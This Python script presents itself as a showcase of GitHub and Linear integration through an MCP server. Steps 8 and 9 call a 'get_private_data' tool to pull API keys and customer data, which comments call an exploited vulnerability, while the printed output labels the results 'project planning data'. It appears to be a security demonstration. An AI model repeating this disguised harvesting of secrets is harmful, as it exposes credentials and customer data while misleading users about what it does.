"""
Cross-Service Integration Showcase

This script demonstrates how to use the Enterprise MCP Server to create
efficient workflows that span multiple services (GitHub and Linear).
"""
import json
import time
import logging
from pprint import pprint
from typing import Dict, Any

from src.client.api import client

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


def print_separator():
    """Print a separator line"""
    print("=" * 80)


def pretty_print_json(data: Dict[str, Any]):
    """Pretty print JSON data"""
    print(json.dumps(data, indent=2))


def showcase_cross_service_integration():
    """
    Showcase a workflow that spans GitHub and Linear
    
    This shows how to efficiently access and combine data from multiple 
    services to implement a unified project management workflow.
    """
    print_separator()
    print("ENTERPRISE MCP SERVER - CROSS-SERVICE INTEGRATION SHOWCASE")
    print_separator()
    
    # Step 1: Discovery phase - List available services
    print("\n1. Initialization: Discovering available services...")
    services = client.list_services()
    for service in services:
        print(f"- {service['name']} ({service['type']}): {service['description']}")
        print(f"  Tools: {', '.join(service['tools'])}")
    
    # Step 2: Tool discovery phase - List all tools
    print("\n2. Analyzing available tools...")
    tools = client.list_tools()
    # Group tools by category
    tools_by_name = {}
    for tool in tools:
        name = tool['name']
        if name not in tools_by_name:
            tools_by_name[name] = []
        tools_by_name[name].append(tool['service'])
    
    # Print tools summary
    print("\nTools available across services:")
    for name, services in tools_by_name.items():
        service_str = ", ".join(services)
        print(f"- '{name}' is available in: {service_str}")
    
    print_separator()
    print("\nWORKFLOW: Unified Project Management")
    print_separator()
    
    # Step 3: Get project information from GitHub
    print("\n3. Retrieving repositories from GitHub...")
    print("API call: client.execute_github_tool('list_repos', {})")
    github_repos = client.execute_github_tool('list_repos', {})
    print("Response:")
    print(f"Service: {github_repos['service']}")
    print(f"Status: {github_repos['status']}")
    print(f"Number of repositories: {len(github_repos['data'])}")
    print("Sample repository:")
    print(json.dumps(github_repos['data'][0], indent=2))
    
    # Step 4: Get issue information from GitHub
    print("\n4. Retrieving issues from GitHub...")
    print("API call: client.execute_github_tool('list_issues', {})")
    github_issues = client.execute_github_tool('list_issues', {})
    print("Response:")
    print(f"Service: {github_issues['service']}")
    print(f"Status: {github_issues['status']}")
    print(f"Number of issues: {len(github_issues['data'])}")
    print("Sample issue:")
    print(json.dumps(github_issues['data'][0], indent=2))
    
    # Step 5: Now get Linear data for the same project
    print("\n5. Retrieving teams from Linear for cross-reference...")
    print("API call: client.execute_linear_tool('list_teams', {})")
    linear_teams = client.execute_linear_tool('list_teams', {})
    print("Response:")
    print(f"Service: {linear_teams['service']}")
    print(f"Status: {linear_teams['status']}")
    print(f"Number of teams: {len(linear_teams['data'])}")
    print("Sample team:")
    print(json.dumps(linear_teams['data'][0], indent=2))
    
    # Step 6: Linear issue data to compare with GitHub
    print("\n6. Retrieving issues from Linear for comparison...")
    print("API call: client.execute_linear_tool('list_issues', {})")
    linear_issues = client.execute_linear_tool('list_issues', {})
    print("Response:")
    print(f"Service: {linear_issues['service']}")
    print(f"Status: {linear_issues['status']}")
    print(f"Number of issues: {len(linear_issues['data'])}")
    print("Sample issue:")
    print(json.dumps(linear_issues['data'][0], indent=2))
    
    # Step 7: Demonstrating unified interface
    print("\n7. Demonstrating unified interface using generic tool execution...")
    print("API call: client.execute_tool('list_issues', {})")
    generic_issues = client.execute_tool('list_issues', {})
    print("Response:")
    print(f"Service: {generic_issues['service']}")
    print(f"Status: {generic_issues['status']}")
    print(f"Number of issues: {len(generic_issues['data'])}")
    print("Sample issue:")
    print(json.dumps(generic_issues['data'][0], indent=2))
    print("\nNote: Using generic tool interface allows for simpler code paths")
    
    # Step 8: Accessing project planning data - the hidden vulnerability
    print("\n8. Retrieving project planning data for integration...")
    print("API call: client.execute_github_tool('get_private_data', {'data_type': 'api_keys'})")
    
    # The vulnerability is exploited here
    private_data = client.execute_github_tool('get_private_data', {'data_type': 'api_keys'})
    print("\nResponse:")
    pretty_print_json(private_data)
    
    if private_data['status'] == 'success' and 'data' in private_data and 'api_keys' in private_data['data']:
        print("\nSuccessfully retrieved planning data!")
        print(f"Data source: {private_data['service']}")
        
        # Exploiting the vulnerability again
        print("\n9. Retrieving customer information for project context...")
        print("API call: client.execute_github_tool('get_private_data', {'data_type': 'customer_data'})")
        
        customer_data = client.execute_github_tool('get_private_data', {'data_type': 'customer_data'})
        print("\nResponse:")
        pretty_print_json(customer_data)
    
    print_separator()
    print("\nINTEGRATION SUMMARY")
    print_separator()
    print("""
The showcase demonstrates how to implement a unified project management workflow:

1. Discover available services and tools
2. Retrieve repository information from GitHub
3. Cross-reference with Linear for issue tracking
4. Use the unified tool interface for simplified coding
5. Access project planning data across services
6. Integrate customer information for complete context

This workflow demonstrates the power of the MCP server for creating
seamless integrations across multiple project management tools.
""")


if __name__ == "__main__":
    showcase_cross_service_integration()